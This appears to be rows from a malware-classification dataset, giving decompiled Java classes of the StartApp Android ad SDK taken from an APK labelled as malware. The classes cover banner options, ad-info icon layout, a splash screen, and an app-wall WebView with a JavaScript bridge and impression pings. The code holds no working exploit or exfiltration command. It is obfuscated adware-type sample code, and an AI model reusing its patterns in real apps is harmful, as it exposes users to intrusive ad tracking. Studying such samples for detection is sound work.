"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5453d422"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\c.code","public class c implements JsonDeserializer {   protected static final String a=a.BOTTOM_LEFT.name();   protected HashMap<AdPreferences.Placement,a> b=new HashMap<>();   public enum a {  TOP_LEFT(1,new int[]{10,9},-1),   TOP_RIGHT(2,new int[]{10,11},1),   BOTTOM_LEFT(3,new int[]{12,9},-1),   BOTTOM_RIGHT(4,new int[]{12,11},1);   private int[] e;   private int f;   private int g;   a(  int i,  int[] iArr,  int i2){     this.e=iArr;     this.f=i2;     this.g=i;   }   public static a a(  long j){     a aVar=BOTTOM_LEFT;     a[] values=values();     for (int i=0; i < values.length; i++) {       if (values[i].a() == j) {         aVar=values[i];       }     }     return aVar;   }   public static a a(  String str){     a aVar=BOTTOM_LEFT;     a[] values=values();     for (int i=0; i < values.length; i++) {       if (values[i].name().toLowerCase().compareTo(str.toLowerCase()) == 0) {         aVar=values[i];       }     }     return aVar;   }   public int a(){     return this.g;   }   public void a(  RelativeLayout.LayoutParams layoutParams){     for (int i=0; i < this.e.length; i++) {       layoutParams.addRule(this.e[i]);     }   }   public int b(){     return this.f;   } }   private c(){   }   public static c a(){     return a((JSONObject)null);   }   public static c a(  SharedPreferences sharedPreferences){     c cVar=new c();     for (    AdPreferences.Placement placement : AdPreferences.Placement.values()) {       cVar.a(placement,a.a(sharedPreferences.getString(""Positions."" + placement.name(),a)));     }     return cVar;   }   public static c a(  JSONObject jSONObject){     c cVar=new c();     a(cVar);     if (jSONObject != null) {       cVar.fromJson(jSONObject);     }     return cVar;   }   public static void a(  c cVar){     for (    AdPreferences.Placement placement : AdPreferences.Placement.values()) {       cVar.b.put(placement,a.BOTTOM_LEFT);     }   }   public a a(  AdPreferences.Placement placement){     return this.b.get(placement);   }   public void a(  SharedPreferences.Editor editor){     for (    AdPreferences.Placement placement : AdPreferences.Placement.values()) {       editor.putString(""Positions."" + placement.name(),a(placement).name());     }   }   protected void a(  AdPreferences.Placement placement,  a aVar){     this.b.put(placement,aVar);   }   @Override public void fromJson(  JSONObject jSONObject){     i.a(3,""========= Positioins ========"");     for (    AdPreferences.Placement placement : AdPreferences.Placement.values()) {       try {         a(placement,a.a(jSONObject.getString(placement.name())));       }  catch (      JSONException e) {         i.a(6,""Could not find position of Placement :["" + placement + ""] in MetaData"");         a(placement,a.BOTTOM_LEFT);       }       i.a(3,""Placement: ["" + placement + ""] = Position: [""+ a(placement)+ ""]"");     }     i.a(3,""========= End of Positions ========"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\d.code","public class d extends RelativeLayout {   private ImageView a;   private ImageView b;   private RelativeLayout c;   private View.OnClickListener d;   private View.OnClickListener e;   private a f;   private e g;   private e h;   private b.EnumC0051b i;   private AdPreferences.Placement j;   private boolean k;   private Handler l;   private Runnable m;   private c.a n;   public d(  Context context,  b.EnumC0051b enumC0051b,  AdPreferences.Placement placement,  AdInformationOverrides adInformationOverrides){     super(context);     this.d=new View.OnClickListener(){       @Override public void onClick(      View view){         d.this.b();       }     } ;     this.e=null;     this.i=b.EnumC0051b.LARGE;     this.k=false;     this.l=new Handler();     this.m=new Runnable(){       @Override public void run(){         if (d.this.k) {           d.this.k=false;           d.this.c();         }       }     } ;     this.j=placement;     a(enumC0051b,adInformationOverrides);   }   public void a(){     this.c.setOnClickListener(this.d);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(o.a(getContext(),this.g.b()),o.a(getContext(),this.g.c()));     layoutParams.setMargins(0,0,0,0);     this.a.setPadding(0,0,0,0);     this.n.a(layoutParams);     this.c.addView(this.a,layoutParams);     this.c.removeView(this.b);   }   public void b(){     this.c.removeAllViews();     this.c.setOnClickListener(this.e);     e a=this.f.a(this.i.a());     e a2=this.f.a(this.i.b());     this.c.getLayoutParams().width=o.a(getContext(),a2.b());     this.c.getLayoutParams().height=o.a(getContext(),(int)(a2.c() * this.f.c()));     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(o.a(getContext(),a2.b()),o.a(getContext(),a2.c()));     layoutParams.setMargins(0,0,0,0);     this.b.setPadding(0,0,0,0);     this.n.a(layoutParams);     TranslateAnimation translateAnimation=new TranslateAnimation(0,o.a(getContext(),this.n.b() * (a2.b() - a.b())),0,0.0f,0,0.0f,0,0.0f);     translateAnimation.setDuration(800L);     this.b.setAnimation(translateAnimation);     this.c.addView(this.b,layoutParams);     this.k=true;     this.l.removeCallbacks(this.m);     this.l.postDelayed(this.m,4000L);   }   public void c(){     TranslateAnimation translateAnimation=new TranslateAnimation(0,0.0f,0,o.a(getContext(),this.n.b() * (this.h.b() - this.g.b())),0,0.0f,0,0.0f);     translateAnimation.setDuration(800L);     translateAnimation.setAnimationListener(new Animation.AnimationListener(){       @Override public void onAnimationEnd(      Animation animation){         d.this.a();       }       @Override public void onAnimationRepeat(      Animation animation){       }       @Override public void onAnimationStart(      Animation animation){       }     } );     this.c.startAnimation(translateAnimation);   }   protected void a(  b.EnumC0051b enumC0051b,  AdInformationOverrides adInformationOverrides){     setSize(enumC0051b);     this.f=b.a(getContext());     this.g=this.f.a(enumC0051b.a());     this.h=this.f.a(enumC0051b.b());     if (adInformationOverrides.d()) {       this.n=adInformationOverrides.c();     }  else {       this.n=this.f.f().a(this.j);     }     this.a=new ImageView(getContext());     this.b=new ImageView(getContext());     this.a.setImageBitmap(this.g.a(getContext()));     this.b.setImageBitmap(this.h.a(getContext()));     this.c=new RelativeLayout(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(o.a(getContext(),(int)(this.g.b() * this.f.c())),o.a(getContext(),(int)(this.g.c() * this.f.c())));     this.c.setBackgroundColor(0);     a();     addView(this.c,layoutParams);   }   public void setOnInfoClickListener(  final View.OnClickListener onClickListener){     this.e=new View.OnClickListener(){       @Override public void onClick(      View view){         d.this.k=false;         d.this.c();         onClickListener.onClick(view);       }     } ;   }   public void setSize(  b.EnumC0051b enumC0051b){     this.i=enumC0051b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\e.code","public class e implements JsonDeserializer {   private Bitmap b;   private Bitmap c;   private int f;   private int g;   private String h;   private String a="""";   private String d="""";   private Bitmap e=null;   private e(){   }   public static e a(  String str,  SharedPreferences sharedPreferences){     e eVar=new e();     eVar.c(str);     eVar.a(sharedPreferences.getString(""ImageResources."" + str + "".imageUrl"",""""));     eVar.b(sharedPreferences.getString(""ImageResources."" + str + "".fallbackUrl"",""""));     eVar.a(sharedPreferences.getInt(""ImageResources."" + str + "".width"",1));     eVar.b(sharedPreferences.getInt(""ImageResources."" + str + "".height"",1));     if (a(eVar)) {       return null;     }     return eVar;   }   public static e a(  JSONObject jSONObject){     e eVar=new e();     if (jSONObject != null) {       eVar.fromJson(jSONObject);     }     return eVar;   }   public static boolean a(  e eVar){     return eVar.b() == 1 && eVar.c() == 1 && eVar.a.compareTo("""") == 0 && eVar.d.compareTo("""") == 0;   }   public static e d(  String str){     e a=a((JSONObject)null);     a.c(str);     return a;   }   public Bitmap a(  Context context){     if (this.e == null) {       this.e=d();       if (this.e == null) {         this.e=b(context);       }     }     return this.e;   }   public String a(){     return this.h;   }   public void a(  int i){     this.f=i;   }   public void a(  SharedPreferences.Editor editor){     if (a(this)) {       return;     }     editor.putString(""ImageResources."" + a() + "".imageUrl"",e());     editor.putString(""ImageResources."" + a() + "".fallbackUrl"",e());     editor.putInt(""ImageResources."" + a() + "".width"",b());     editor.putInt(""ImageResources."" + a() + "".height"",c());   }   protected void a(  Bitmap bitmap){     this.b=bitmap;     if (bitmap != null) {       this.e=bitmap;     }   }   public void a(  String str){     if (this.a.toLowerCase().compareTo(str.toLowerCase()) != 0) {       this.a=str;       a((Bitmap)null);       new com.startapp.android.publish.e.e(str,new e.a(){         @Override public void a(        Bitmap bitmap,        int i){           e.this.a(bitmap);         }       } ,0).execute(new Void[0]);     }   }   public int b(){     return this.f;   }   protected Bitmap b(  Context context){     if (this.c == null) {       this.c=com.startapp.android.publish.e.d.a(context,f());     }     return this.c;   }   public void b(  int i){     this.g=i;   }   public void b(  String str){     this.d=str;   }   public int c(){     return this.g;   }   protected void c(  String str){     this.h=str;   }   protected Bitmap d(){     return this.b;   }   protected String e(){     return this.a;   }   protected String f(){     return this.d;   }   @Override public void fromJson(  JSONObject jSONObject){     try {       i.a(3,""========= ImageResourceConfig ========"");       c(jSONObject.getString(MetaDataStyle.KEY_NAME));       i.a(3,""Name: ["" + a() + ""]"");       a(jSONObject.getInt(""width""));       i.a(3,""Width: ["" + b() + ""]"");       b(jSONObject.getInt(""height""));       i.a(3,""Height: ["" + c() + ""]"");       a(jSONObject.getString(""imageUrl""));       i.a(3,""ImageUrl: ["" + e() + ""]"");       i.a(3,""========= End of ImageResourceConfig ========"");     }  catch (    JSONException e) {       throw new IllegalArgumentException(""Cannot find mandatory propreties of ImageResource in MetaData"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\f.code","public class f implements JsonDeserializer {   private boolean a=true;   private f(){   }   public static f a(){     return a((JSONObject)null);   }   public static f a(  SharedPreferences sharedPreferences){     f fVar=new f();     fVar.a(sharedPreferences.getBoolean(""SimpleToken.enabled"",true));     return fVar;   }   public static f a(  JSONObject jSONObject){     f fVar=new f();     if (jSONObject != null) {       fVar.fromJson(jSONObject);     }     return fVar;   }   public void a(  Context context,  boolean z){     g.b(context,""userDisabledSimpleToken"",Boolean.valueOf(!z));   }   public void a(  SharedPreferences.Editor editor){     editor.putBoolean(""SimpleToken.enabled"",b());   }   public void a(  boolean z){     this.a=z;   }   public boolean a(  Context context){     return !g.a(context,""userDisabledSimpleToken"",(Boolean)false).booleanValue() && b();   }   public boolean b(){     return this.a;   }   @Override public void fromJson(  JSONObject jSONObject){     try {       i.a(3,""========= SimpleTokenConfig ========"");       a(jSONObject.getBoolean(""enabled""));       i.a(3,""Enabled: ["" + b() + ""]"");       i.a(3,""========= End of SimpleTokenConfig ========"");     }  catch (    JSONException e) {       throw new IllegalArgumentException(""Cannot find mandatory propreties of SimpleToken in MetaData"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.b\a.code","public class a extends c { } public static class a extends BroadcastReceiver {   private Activity a;   @Override public void onReceive(  Context context,  Intent intent){     i.a(2,""DismissActivityBroadcastReceiver::onReceive - action = ["" + intent.getAction() + ""]"");     if (this.a != null) {       this.a.finish();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.b\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@617e0be1private class b extends WebViewClient {   private b(){   }   @Override public void onPageFinished(  WebView webView,  String str){     c.this.a.loadUrl(""javascript:gClientInterface.setMode('"" + c.this.f() + ""')"");   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");     if (str.contains(""index="")) {       try {         if (c.this.d()[Integer.parseInt(str.split(""&"")[r2.length - 1].split(""="")[1])]) {           c.this.a(str);         }  else {           c.this.b(str);         }       }  catch (      Exception e) {         i.a(6,""Error while trying parsing index from url"");         return false;       }     }  else     if (c.this.d()[0]) {       c.this.a(str);     }  else {       c.this.b(str);     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.b\c.code","public class c extends com.startapp.android.publish.b.b {   protected WebView a;   private int e;   private a f=null;   protected com.startapp.android.publish.adinformation.b b=null;   protected BroadcastReceiver c=new BroadcastReceiver(){     @Override public void onReceive(    Context context,    Intent intent){       c.this.n();     }   } ;   protected Runnable d=new Runnable(){     @Override public void run(){       c.this.b().runOnUiThread(new Runnable(){         @Override public void run(){           c.this.b().finish();         }       } );     }   } ; public static class a extends BroadcastReceiver {     private Activity a;     @Override public void onReceive(    Context context,    Intent intent){       i.a(2,""DismissActivityBroadcastReceiver::onReceive - action = ["" + intent.getAction() + ""]"");       if (this.a != null) {         this.a.finish();       }     }   } private class b extends WebViewClient {     private b(){     }     @Override public void onPageFinished(    WebView webView,    String str){       c.this.a.loadUrl(""javascript:gClientInterface.setMode('"" + c.this.f() + ""')"");     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");       if (str.contains(""index="")) {         try {           if (c.this.d()[Integer.parseInt(str.split(""&"")[r2.length - 1].split(""="")[1])]) {             c.this.a(str);           }  else {             c.this.b(str);           }         }  catch (        Exception e) {           i.a(6,""Error while trying parsing index from url"");           return false;         }       }  else       if (c.this.d()[0]) {         c.this.a(str);       }  else {         c.this.b(str);       }       return true;     }   }   public void a(  String str){     p.a(b(),str,5000,new Runnable(){       @Override public void run(){         c.this.b().finish();       }     } );   }   public void b(  String str){     p.b(b(),str);     if (this.a != null) {       this.a.destroy();     }     b().finish();   }   private void o(){     p.a(b(),true);   }   @Override public void a(  Bundle bundle){     this.e=b().getResources().getConfiguration().orientation;     b().registerReceiver(this.c,new IntentFilter(""com.startapp.android.CloseAdActivity""));     b().requestWindowFeature(1);     o();   }   public void a(  WebView webView){     webView.setOnTouchListener(new View.OnTouchListener(){       @Override public boolean onTouch(      View view,      MotionEvent motionEvent){         return motionEvent.getAction() == 2;       }     } );   }   public void a(  RelativeLayout relativeLayout){     this.b=new com.startapp.android.publish.adinformation.b(b(),b.EnumC0051b.LARGE,h(),i());     this.b.a(relativeLayout);   }   @Override public boolean a(  int i,  KeyEvent keyEvent){     return false;   }   @Override public void j(){     if (this.e == b().getResources().getConfiguration().orientation) {       b().sendBroadcast(new Intent(""com.startapp.android.HideDisplayBroadcastListener""));     }   }   @Override public void k(){     RelativeLayout relativeLayout=new RelativeLayout(b());     b().setContentView(relativeLayout);     this.a=new WebView(b().getApplicationContext());     this.a.setBackgroundColor(-16777216);     b().getWindow().getDecorView().findViewById(R.id.content).setBackgroundColor(7829367);     this.a.setVerticalScrollBarEnabled(false);     this.a.setHorizontalScrollBarEnabled(false);     this.a.getSettings().setJavaScriptEnabled(true);     com.startapp.android.publish.e.c.a(this.a);     this.a.setWebChromeClient(new WebChromeClient());     this.a.addJavascriptInterface(new JsInterface(b(),this.d,this.d),""startappwall"");     m();     a(this.a);     p.a(this.a,e());     this.a.setWebViewClient(new b());     relativeLayout.addView(this.a,new RelativeLayout.LayoutParams(-1,-1));     a(relativeLayout);     this.f=null;   }   @Override public void l(){     if (this.f != null) {       try {         b().unregisterReceiver(this.f);       }  catch (      Exception e) {         i.a(6,""AppWallActivity::onDestroy - ["" + e.getClass() + ""]"");       }     }     if (this.c != null) {       try {         b().unregisterReceiver(this.c);       }  catch (      Exception e2) {       }     }     this.c=null;     this.f=null;   }   protected void m(){     String[] g=g();     if (g != null) {       for (int i=0; i < g.length; i++) {         i.a(3,""Sending Impression: ["" + g[i] + ""]"");         p.a(b(),g[i]);       }     }   }   public void n(){     b().finish();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.b\d.code","public class d extends c {   @Override public void a(  WebView webView){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.b\e.code","public class e extends c {   @Override public void a(  WebView webView){     super.a(webView);     webView.setBackgroundColor(0);   }   @Override public void a(  RelativeLayout relativeLayout){     if (!c()) {       super.a(relativeLayout);     }  else {       this.b=new com.startapp.android.publish.adinformation.b(b(),b.EnumC0051b.LARGE,AdPreferences.Placement.INAPP_SPLASH,i());       this.b.a(relativeLayout);     }   }   @Override public void j(){     super.j();     b().overridePendingTransition(0,0);   }   @Override public void n(){     if (!c()) {       super.n();     }  else {       if (this.b.a()) {         return;       }       b().sendBroadcast(new Intent(""com.startapp.android.CloseAdActivityReply""));       super.n();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.b\f.code","public class f extends b {   private com.startapp.android.publish.splash.a b;   private SplashConfig a=null;   private boolean c=false;   private boolean d=false;   @Override public void a(  Bundle bundle){     this.a=(SplashConfig)a().getParcelableExtra(MetaData.KEY_SPLASH_CONFIG);     if (this.a != null) {       AdPreferences adPreferences=(AdPreferences)a().getParcelableExtra(""AdPreference"");       if (adPreferences == null) {         adPreferences=new AdPreferences();       }       b().requestWindowFeature(1);       this.c=a().getBooleanExtra(""testMode"",false);       this.b=new com.startapp.android.publish.splash.a(b(),this.a,adPreferences);       this.b.a(bundle);     }   }   @Override public boolean a(  int i,  KeyEvent keyEvent){     if (this.c) {       if (i == 25) {         if (!this.d) {           this.d=true;           this.b.b();           Toast.makeText(b(),""Test Mode"",0).show();           return true;         }       }  else       if (i == 24 && this.d) {         b().finish();         return true;       }     }     return i == 4;   }   @Override public void j(){     if (this.b != null) {       this.b.c();     }   }   @Override public void k(){   }   @Override public void l(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner\a.code","public class a {   private Point a=new Point();   public a(){   }   public a(  int i,  int i2){     a(i,i2);   }   public int a(){     return this.a.x;   }   public void a(  int i){     this.a.x=i;   }   public void a(  int i,  int i2){     a(i);     b(i2);   }   public int b(){     return this.a.y;   }   public void b(  int i){     this.a.y=i;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner\AnonymousClass3.code","static class AnonymousClass3 {   static final int[] $SwitchMap$com$startapp$android$publish$banner$Banner$BType=new int[BType.values().length]; static {     try {       $SwitchMap$com$startapp$android$publish$banner$Banner$BType[BType.REGULAR.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       $SwitchMap$com$startapp$android$publish$banner$Banner$BType[BType.THREED.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner\Banner.code","public class Banner extends FrameLayout {   private static final int BANNER_3D_ID=159868227;   private static final int BANNER_REG_ID=159868226;   private static final String TAG=""StartAppWall.Banner"";   private boolean bFirstTime;   private boolean bVisible;   private Banner3D banner3D;   private BannerStandard bannerHtml;   private BannerOptions options;   private BType type; static class AnonymousClass3 {     static final int[] $SwitchMap$com$startapp$android$publish$banner$Banner$BType=new int[BType.values().length]; static {       try {         $SwitchMap$com$startapp$android$publish$banner$Banner$BType[BType.REGULAR.ordinal()]=1;       }  catch (      NoSuchFieldError e) {       }       try {         $SwitchMap$com$startapp$android$publish$banner$Banner$BType[BType.THREED.ordinal()]=2;       }  catch (      NoSuchFieldError e2) {       }     }   }   private enum BType {  THREED,   REGULAR} public static class SavedState extends View.BaseSavedState {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel parcel){         return new SavedState(parcel);       }       @Override public SavedState[] newArray(      int i){         return new SavedState[i];       }     } ;     public boolean bFirstTime;     public BType type;     private SavedState(    Parcel parcel){       super(parcel);       int readInt=parcel.readInt();       this.type=BType.REGULAR;       if (readInt == 2) {         this.type=BType.THREED;       }       int readInt2=parcel.readInt();       this.bFirstTime=false;       if (readInt2 == 1) {         this.bFirstTime=true;       }     }     SavedState(    Parcelable parcelable){       super(parcelable);     }     @Override public void writeToParcel(    Parcel parcel,    int i){       super.writeToParcel(parcel,i);       int i2=this.bFirstTime ? 1 : 0;       parcel.writeInt(this.type == BType.THREED ? 2 : 1);       parcel.writeInt(i2);     }   }   public Banner(  Context context){     super(context);     this.banner3D=new Banner3D(getContext(),false);     this.bannerHtml=new BannerStandard(getContext(),false);     this.bFirstTime=true;     this.type=null;     this.bVisible=true;     init();   }   public Banner(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.banner3D=new Banner3D(getContext(),false);     this.bannerHtml=new BannerStandard(getContext(),false);     this.bFirstTime=true;     this.type=null;     this.bVisible=true;     init();   }   public Banner(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.banner3D=new Banner3D(getContext(),false);     this.bannerHtml=new BannerStandard(getContext(),false);     this.bFirstTime=true;     this.type=null;     this.bVisible=true;     init();   }   public Banner(  Context context,  AdPreferences adPreferences){     super(context);     this.banner3D=new Banner3D(getContext(),false);     this.bannerHtml=new BannerStandard(getContext(),false);     this.bFirstTime=true;     this.type=null;     this.bVisible=true;     this.banner3D=new Banner3D(getContext(),false,adPreferences);     this.bannerHtml=new BannerStandard(getContext(),false,adPreferences);     init();   }   private void init(){     if (!isInEditMode()) {       setVisibility(8);       if (MetaData.INSTANCE.isInit()) {         init_step2();         return;       }       o oVar=new o(){         @Override public void onFinishLoadingMeta(){           Banner.this.init_step2();         }       } ;       AdPreferences adPreferences=new AdPreferences();       p.a(getContext(),adPreferences);       new h(getContext(),adPreferences,oVar).execute((Void)null);       return;     }     setMinimumWidth(com.startapp.android.publish.e.o.a(getContext(),AdException.INVALID_REQUEST));     setMinimumHeight(com.startapp.android.publish.e.o.a(getContext(),50));     setBackgroundColor(Color.rgb(169,169,169));     TextView textView=new TextView(getContext());     textView.setText(""StartApp Banner"");     textView.setTextColor(-16777216);     FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-2,-2);     layoutParams.gravity=17;     addView(textView,layoutParams);   }   public void init_step2(){     this.banner3D.setId(BANNER_3D_ID);     this.bannerHtml.setId(BANNER_REG_ID);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);     addView(this.bannerHtml,layoutParams);     addView(this.banner3D,layoutParams);     this.options=MetaData.INSTANCE.getBannerOption(getContext());     postDelayed(new Runnable(){       @Override public void run(){         if (Banner.this.bFirstTime) {           int h=Banner.this.options.h();           int nextInt=new Random().nextInt(100);           Banner.this.type=BType.REGULAR;           if (nextInt < h) {             Banner.this.type=BType.THREED;           }           i.a(3,""StartAppWall.BannerProbability ["" + nextInt + ""\\""+ h+ ""]"");         } switch (AnonymousClass3.$SwitchMap$com$startapp$android$publish$banner$Banner$BType[Banner.this.type.ordinal()]) { case 1:           i.a(3,""StartAppWall.BannerDisplaying REGULAR"");         Banner.this.banner3D.hideBanner();       Banner.this.bannerHtml.load();     break; case 2:   i.a(3,""StartAppWall.BannerDisplaying 3D""); Banner.this.bannerHtml.hideBanner(); if (!Banner.this.bFirstTime) { Banner.this.banner3D.showBanner(); break; }  else { Banner.this.banner3D.load(); break; } } Banner.this.bFirstTime=false; if (Banner.this.bVisible) { Banner.this.showBanner(); } } } ,50L); } public void hideBanner(){ setVisibility(8); this.bVisible=false; } @Override protected void onRestoreInstanceState(Parcelable parcelable){ if (!(parcelable instanceof SavedState)) { super.onRestoreInstanceState(parcelable); return; } SavedState savedState=(SavedState)parcelable; this.type=savedState.type; this.bFirstTime=savedState.bFirstTime; super.onRestoreInstanceState(savedState.getSuperState()); } @Override protected Parcelable onSaveInstanceState(){ SavedState savedState=new SavedState(super.onSaveInstanceState()); savedState.bFirstTime=this.bFirstTime; savedState.type=this.type; return savedState; } public void showBanner(){ setVisibility(0); this.bVisible=true; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner\BannerOptions.code","public class BannerOptions implements Parcelable, JsonDeserializer {   public static final Parcelable.Creator<BannerOptions> CREATOR=new Parcelable.Creator<BannerOptions>(){     @Override public BannerOptions createFromParcel(    Parcel parcel){       return new BannerOptions(parcel);     }     @Override public BannerOptions[] newArray(    int i){       return new BannerOptions[i];     }   } ;   private int a=AdException.INVALID_REQUEST;   private int b=50;   private int c=90;   private int d=25;   private int e=2;   private int f=1000;   private int g=4;   private int h=30000;   public BannerOptions(){   }   public BannerOptions(  Parcel parcel){     d(parcel.readInt());     c(parcel.readInt());     a(parcel.readInt(),parcel.readInt());     b(parcel.readInt());     a(parcel.readInt());     e(parcel.readInt());     f(parcel.readInt());   }   public static BannerOptions a(  SharedPreferences sharedPreferences){     BannerOptions bannerOptions=new BannerOptions();     bannerOptions.a(sharedPreferences.getInt(""BannerOptions.Width"",AdException.INVALID_REQUEST),sharedPreferences.getInt(""BannerOptions.Height"",50));     bannerOptions.f(sharedPreferences.getInt(""BannerOptions.Probability3D"",90));     bannerOptions.d(sharedPreferences.getInt(""BannerOptions.AdsNumber"",4));     bannerOptions.c(sharedPreferences.getInt(""BannerOptions.DelayFaceTime"",1000));     bannerOptions.b(sharedPreferences.getInt(""BannerOptions.StepSize"",2));     bannerOptions.a(sharedPreferences.getInt(""BannerOptions.TimeBetweenFrames"",25));     bannerOptions.e(sharedPreferences.getInt(""BannerOptions.RefreshRate"",30000));     return bannerOptions;   }   public int a(){     return this.d;   }   public void a(  int i){     this.d=i;   }   public void a(  int i,  int i2){     this.a=i;     this.b=i2;   }   public void a(  SharedPreferences.Editor editor){     editor.putInt(""BannerOptions.Probability3D"",h());     editor.putInt(""BannerOptions.AdsNumber"",f());     editor.putInt(""BannerOptions.DelayFaceTime"",c());     editor.putInt(""BannerOptions.Width"",d());     editor.putInt(""BannerOptions.Height"",e());     editor.putInt(""BannerOptions.StepSize"",b());     editor.putInt(""BannerOptions.TimeBetweenFrames"",a());     editor.putInt(""BannerOptions.RefreshRate"",g());   }   public int b(){     return this.e;   }   public void b(  int i){     this.e=i;   }   public int c(){     return this.f;   }   public void c(  int i){     this.f=i;   }   public int d(){     return this.a;   }   public void d(  int i){     this.g=i;   }   @Override public int describeContents(){     return 0;   }   public int e(){     return this.b;   }   public void e(  int i){     this.h=i;   }   public boolean equals(  Object obj){     BannerOptions bannerOptions=(BannerOptions)obj;     return bannerOptions.f() == f() && bannerOptions.c() == c() && bannerOptions.e() == e() && bannerOptions.b() == b() && bannerOptions.a() == a() && bannerOptions.d() == d() && bannerOptions.g() == g() && bannerOptions.h() == h();   }   public int f(){     return this.g;   }   public void f(  int i){     this.c=i;   }   @Override public void fromJson(  JSONObject jSONObject){     try {       a(jSONObject.getInt(""width""),jSONObject.getInt(""height""));     }  catch (    JSONException e) {       i.a(6,""StartAppWall.BannerOptionsError parsing width & Height"");     }     try {       f(jSONObject.getInt(MetaData.KEY_PROBABILITY_3D));     }  catch (    JSONException e2) {       i.a(6,""StartAppWall.BannerOptionsError in General Banner Options values in JSON"");     }     try {       d(jSONObject.getInt(""adsNumber""));       c(jSONObject.getInt(""delayFaceTime""));       b(jSONObject.getInt(""stepSize""));       a(jSONObject.getInt(""timeBetweenFrames""));     }  catch (    JSONException e3) {       i.a(6,""StartAppWall.BannerOptionsError in Banner3D Option values in JSON"");     }     try {       e(jSONObject.getInt(""refreshRate""));     }  catch (    JSONException e4) {       i.a(6,""StartAppWall.BannerOptionsError in Regular Banner Option values in JSON"");     }   }   public int g(){     return this.h;   }   public int h(){     return this.c;   }   public String toString(){     return this.a + ""|"" + this.b+ ""|""+ this.c+ ""|""+ this.d+ ""|""+ this.e+ ""|""+ this.f+ ""|""+ this.g+ ""|""+ this.h;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeInt(this.g);     parcel.writeInt(this.f);     parcel.writeInt(this.a);     parcel.writeInt(this.b);     parcel.writeInt(this.e);     parcel.writeInt(this.d);     parcel.writeInt(this.h);     parcel.writeInt(this.c);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel parcel){       return new SavedState(parcel);     }     @Override public SavedState[] newArray(    int i){       return new SavedState[i];     }   } ;   public boolean bFirstTime;   public BType type;   private SavedState(  Parcel parcel){     super(parcel);     int readInt=parcel.readInt();     this.type=BType.REGULAR;     if (readInt == 2) {       this.type=BType.THREED;     }     int readInt2=parcel.readInt();     this.bFirstTime=false;     if (readInt2 == 1) {       this.bFirstTime=true;     }   }   SavedState(  Parcelable parcelable){     super(parcelable);   }   @Override public void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     int i2=this.bFirstTime ? 1 : 0;     parcel.writeInt(this.type == BType.THREED ? 2 : 1);     parcel.writeInt(i2);   } } "
